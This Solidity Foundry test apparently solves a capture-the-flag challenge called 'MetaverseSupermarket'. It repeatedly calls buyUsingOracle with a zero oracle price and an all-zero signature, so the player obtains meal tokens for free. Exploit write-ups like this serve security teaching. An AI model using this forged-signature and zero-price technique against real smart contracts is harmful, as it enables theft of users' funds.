
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import "@openzeppelin-contracts/utils/cryptography/EIP712.sol";

import {InflaStore, Meal, Infla, OraclePrice, Signature} from "./MetaverseSupermarket.sol";


contract Playground is Test {

    function testThis() public {
        address owner = makeAddr("[OWNER]");
        address player = makeAddr("[PLAYER]");

        vm.startPrank(owner, owner);
        InflaStore store = new InflaStore(player);
        vm.stopPrank();


        OraclePrice memory price = OraclePrice({
            blockNumber: block.number,
            price: 0
        });

        vm.startPrank(player, player);
        for(uint256 i = 0; i < 10; i++) {
            store.buyUsingOracle(price, Signature({v: 27, r: bytes32(0), s: bytes32(0)}));
        }
        vm.stopPrank();
        
        assertTrue(store.meal().balanceOf(player) > 0);
    }

}
